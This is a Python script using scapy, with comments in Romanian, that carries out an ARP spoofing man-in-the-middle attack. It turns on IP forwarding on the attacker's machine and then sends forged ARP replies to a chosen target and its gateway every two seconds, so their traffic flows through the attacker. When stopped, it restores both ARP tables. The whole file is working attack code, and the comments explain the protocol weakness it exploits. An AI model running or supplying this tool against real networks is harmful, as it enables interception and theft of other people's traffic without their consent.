#!/usr/bin/env python3

import argparse
import scapy.all as scapy
import subprocess
import time

# Functia getInput foloseste un parser in scopul gestionarii argumentelor pe care utilizatorul trebuie sa le introduca atunci cand ruleaza programul in terminal
def getInput():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="targetIP", help="Your target's IP address")
    parser.add_argument("-g", "--gateway", dest="gatewayIP", help="The gateway's IP address")
    arguments = parser.parse_args()
    if not arguments.targetIP:
        parser.error("Please specify your target's IP address. Use -h or --help for more details!")
    if not arguments.gatewayIP:
        parser.error("Please specify the gateway's IP address. Use -h or --help for more details!")
    return arguments
    
# Functia getMAC trimite o cerere ARP la adresa de broadcast a retelei pentru a afla adresa MAC a unui client a carei adresa IP o cunoastem
# Functia srp din librarie ne permite sa trimitem pachete si, in acelasi timp, sa accesam setul de raspunsuri primite (contine adresa MAC cautata)
def getMAC(ip):
    macHeader = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequest = scapy.ARP(pdst=ip)
    packet = macHeader/arpRequest
    responsesList = scapy.srp(packet, timeout=1, verbose=False)[0]
    return responsesList[0][1].hwsrc

# Functia spoof profita de vulnerabilitatile de securitate ale protocolului ARP (clientii conectati la retea pot sa accepte un raspuns ARP fara sa fi trimis vreo cerere)
# Functia trimite un raspuns ARP catre tinta in numele clientului cu IP-ul "spoofIP" (op=1 -> cerere ARP, op=2 -> raspuns ARP)
# Astfel, in tabela ARP a tintei, adresa MAC reala a clientului cu IP-ul "spoofIP" va fi inlocuita cu adresa MAC a atacatorului (a celui care utilizeaza programul)
def spoof(targetIP, spoofIP):
    targetMAC = getMAC(targetIP)
    arpResponse = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMAC, psrc=spoofIP)
    scapy.send(arpResponse, verbose=False)

# Functia restoreTable va fi folosita pentru restaurarea tabelelor ARP ale victimelor (tinta si gateway-ul) la valorile initiale dupa ce utilizatorul stopeaza atacul
def restoreTable(destinationIP, sourceIP):
    destinationMAC = getMAC(destinationIP)
    sourceMAC = getMAC(sourceIP)
    arpResponse = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    scapy.send(arpResponse, count=4, verbose=False)

# Program principal
# Pentru ca datele trimise intre tinta si gateway sa poata fi interceptate, disecate si analizate, se va activa port forwarding pe computerul utilizatorului
# Scopul activarii port forwarding este ca pachetele trimise de tinta catre gateway si inapoi sa poata circula prin utilizator dupa ce a devenit MITM
# La fiecare doua secunde, programul "pacaleste" tinta ca gateway-ul are adresa MAC a atacatorului si gateway-ul ca tinta are adresa MAC a atacatorului
userInput = getInput()
print("arpSpoofer on!")
print("[+] Enabling port forwarding...")
subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
packetsCount = 0
try:
    while True:
        spoof(userInput.targetIP, userInput.gatewayIP)
        spoof(userInput.gatewayIP, userInput.targetIP)
        packetsCount = packetsCount + 2
        print("\r[+] Packets sent: " + str(packetsCount), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Program closed! Restoring ARP tables...")
    restoreTable(userInput.targetIP, userInput.gatewayIP)
    restoreTable(userInput.gatewayIP, userInput.targetIP)
print("[-] Disabling port forwarding...")
subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
print("arpSpoofer off!")
